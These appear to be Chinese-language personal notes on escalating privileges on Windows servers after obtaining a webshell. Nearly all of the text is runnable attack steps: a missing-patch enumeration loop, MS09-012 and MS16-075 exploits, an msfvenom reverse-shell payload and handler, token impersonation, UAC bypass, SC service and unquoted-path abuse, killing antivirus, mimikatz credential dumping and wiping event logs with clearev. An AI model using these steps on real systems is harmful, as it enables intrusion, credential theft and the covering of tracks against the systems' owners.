思路：目前我们是有拿到webshell的，那么说明该站点根目录是具有可读写的权限，此时我们可以通过菜刀上传一个脚本去检测网站目录的权限（使用脚本666.asp检测目录权限）
上传cmd.exe
setp xxx\cmd.exe


systeminfo>micropoor.txt&(for %i in ( KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type micropoor.txt|@find /i "%i"|| @echo %i you can fuck)&del /f /q /a micropoor.txt
或者
systeminfo > micropoor.txt & (for %i in (KB977165 KB2160329 KB2503665 KB2592799

KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228

KB3143141 KB3141780 KB885835 KB896424 KB893066 KB890830 KB873333 KB891781

KB873339 KB885836 KB888113 KB890046 KB891861 KB893086 KB896358 KB899587 KB899588

KB900725 KB901214 KB902400 KB904706 KB905414 KB905749 KB908519 KB908531 KB910437

KB911562 KB911927 KB912919 KB913580 KB914388 KB915800 KB916281 KB917344 KB918118

KB918439 KB918899 KB919007 KB920213 KB920342 KB920670 KB920683 KB920685 KB922582

KB922819 KB923191 KB923414 KB923980 KB924270 KB924667 KB925398 KB925902 KB926122

KB926255 KB926436 KB927436 KB928843 KB928255 KB929123 KB930178 KB930916 KB931784

KB932168 KB932590 KB933566 KB935839 KB936021 KB936782 KB937143 KB938127 KB938464

KB939373 KB940541 KB941569 KB941644 KB942830 KB943055 KB943460 KB944338 KB944653

KB945553 KB946648 KB948496 KB950762 KB950974 KB951066 KB951748 KB952004 KB952954

KB953155 KB953298 KB953761 KB954155 KB954459 KB955069 KB955839 KB956803 KB957095

KB957097 KB958644 KB959426 KB959454 KB960225 KB960803 KB961501 KB961729 KB963093

KB967715 KB968389 KB968537 KB968585 KB969604 KB970430 KB971468 KB971657 KB971961

KB973507 KB973869 KB973904 KB974112 KB974318 KB974392 KB974571 KB975025 KB975467

KB975560 KB975713 KB976098 KB976323 KB976662 KB976749 KB977914 KB978037 KB978338

KB978542 KB978601 KB978695 KB978835 KB979309 KB979683 KB980232 KB981957 KB982316)

do @findstr /i /c:"%i" micropoor.txt > nul || @echo %i is missing) & del /f /q

micropoor.txt




一、巴西烤肉-MS09-012
pr.exe "whoami"
pr.exe "net user yy 110815_yw /add"
pr.exe "net localgroup administrators yy /add"

打开远程桌面
pr.exe "3389.exe"
用mstsc连接

二、烂土豆-MS16-075
kali:
msfvenom  -p windows/meterpreter/reverse_tcp lhost=192.168.163.133 lport=4444 -f exe -o /tmp/hack.exe

use exploit/multi/handler 
set payload windows/meterpreter/reverse_tcp
run

getuid
getsystem
**==此时权限不够，需要提权==**，烂土豆上场
background
search ms16-075
use 0
show options
info
set target 1 

sessions -i
set session x

getuid
MS16-075漏洞在提权过程中，是不会直接把当前会话权限提升到system的，需要伪造身份令牌来窃取token值，达到提权

use incognito
加载incoginto功能(用来盗窃目标主机的令牌或是假冒用户)

使用list_tokens -u命令可以列出目标主机用户的可用令牌，找到system权限。最后伪造token值（身份令牌）就可以成功提权了
list_tokens -u

输入命令进行token值伪造：
impersonate_token "NT AUTHORITY\SYSTEM"
getuid


load kiwi
creds_all


`===========win7================`
use exploit/windows/local/ask
quit
use exploit/windows/local/bypassuac

getuid
    admin
getsystem
    system




windows提权之其他方式提权

方式一：利用系统SC命令提权。
1，使用命令创建一个服务，执行命令会弹出一个新的cmd窗口，此时我们就得到了一个system权限的cmd环境。

SC是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于“控制面板”中“管理工具”项中的“服务”

当我们有administrator权限时，可以通过SC命令创建一个服务，通过SC命令启动此服务即可提权。

具体操作（以win2003系统为例）

`sc Create syscm binPath= "cmd /K start" type= own type= interact`

#命令的意思是：创建一个syscm服务，服务的binPath路径等"cmd /K start"（启动一个CMD）

type表示类型

2，执行命令：
`sc start syscm`

会弹出一个新的cmd窗口，此时我们就得到了一个system权限的cmd环境。


方式二 ：利用配置文件中带有不安全的空格提权

==`当系统管理员配置Windows服务时，他们必须指定要执行的命令，或者运行可执行文件的路径。`==

==`当Windows服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会`==

==`按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的`==

==服务路径的第一个实例。==

那么我们可以利用这个机制，通过上传脚本并将脚本名命名为路径空格前面的内容：
比如路径中存在Common Files，那么我们将脚本命名为：Common.exe，当管理员去点击第三方软件或者重启服务器时，触发系统去调用软件的安装路径：Common Files中的服务或者程序的时候，可能就会触发我们上传的Common.exe脚本。
此时服务器重启，系统调用配置文件时也调用了我们刚刚上传的脚本文件，如果遇到没有安全意识的运维人员可能就直接忽略掉了此次提醒了。那么如果遇到第三方软件是使用管理员身份进行安装的话呢，我们的脚本木马也会继承管理员权限。那么我们也成功的达到了提权的目的。

**注意：此种方法一般适用于第三方应用软件，特别是那些不带数字签名的软件。一**

**般的操作系统自带的服务因为存在数字签名所以即使去进行更改，也不会去成功。**

**当然前提是对方的这个第三方应用软件的安装路径也是具有可读写的权限才行！**




## 后续提权操作  
https://www.cnblogs.com/backlion/p/9484950.html

## 1. 基本信息搜集

检测目标机是否为虚拟机。在Meterpreter会话执行以下命令即可：

run post/windows/gather/checkvm #是否虚拟机，此处判断并不准确，模块代码仍需完善  
通过meterpreter的killav脚本来杀死目标主机运行的杀毒软件，在Meterpreter会话执行以下命令即可：
run killav
获取安装软件信息，在Meterpreter会话执行以下命令即可：
run post/windows/gather/enum_applications #获取安装软件信息
获取目标机器最近的文件操作，在Meterpreter会话执行以下命令即可：
run post/windows/gather/dumplinks   #获取最近的文件操作



2.hash与明文密码读取
获取目标机系统用户Hash，，在Meterpreter会话执行以下命令即可：

run post/windows/gather/smart_hashdump
获得了本地账户的hask，获取明文密码，我们需要先载入mimikatz模块，在Meterpreter会话执行以下命令即可：

load mimikatz  
然后需要确保当前进程为系统权限，直接执行以下命令：
msv
返回了以下信息：
[+] Running as SYSTEM Retrieving msv credentials  上述返回信息表明当前进程是`SYSTEM`权限.  
然后执行以下命令即可导出系统用户明文密码：
kerberos

执行以下命令通过mimikatz命令行方式导出系统用户hash：
meterpreter > mimikatz_command -f samdump::hashes

执行以下命令通过`mimikatz`命令行方式导出系统用户的明文密码：
mimikatz_command -f sekurlsa::searchPasswords


## 3. 清理痕迹

直接执行以下命令：

clearev  
可以看到如下返回：

meterpreter > clearev


**windows10提权方法：**
https://blog.csdn.net/qq_54030686/article/details/127812207

